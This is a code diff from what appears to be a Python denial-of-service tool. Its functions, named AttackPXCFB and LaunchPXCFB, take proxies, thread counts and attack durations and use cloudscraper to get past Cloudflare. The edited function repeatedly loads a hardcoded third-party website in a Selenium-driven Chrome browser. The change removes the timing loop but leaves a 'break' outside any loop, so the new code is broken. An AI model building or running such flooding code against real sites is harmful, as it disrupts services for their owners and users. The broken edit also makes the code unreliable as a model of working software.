@@ -574,19 +574,19 @@ def AttackPXCFB(url, until_datetime, scraper,proxies,th):
             break
         
 def AttackPXCFB3(url, until_datetime, scraper,proxies,th):
-    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
-        try:
-            driver = webdriver.Chrome( )
-            # Define the URL you want to scrape
-            url = 'https://xvideos68.com'
-            for _ in range(50):
-                driver.get(url)
-                # Get the page title
-                page_title = driver.title
-                print(page_title)
-        except Exception as e:
-            print('falid--------------',e)
-            break
+    try:
+        driver = webdriver.Chrome( )
+        # Define the URL you want to scrape
+        url = 'https://xvideos68.com'
+        for _ in range(50):
+            driver.get(url)
+            # Get the page title
+            page_title = driver.title
+            print(page_title)
+    except Exception as e:
+        print('falid--------------',e)
+        break
+        
 def LaunchPXCFB(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     scraper = cloudscraper.create_scraper( browser={
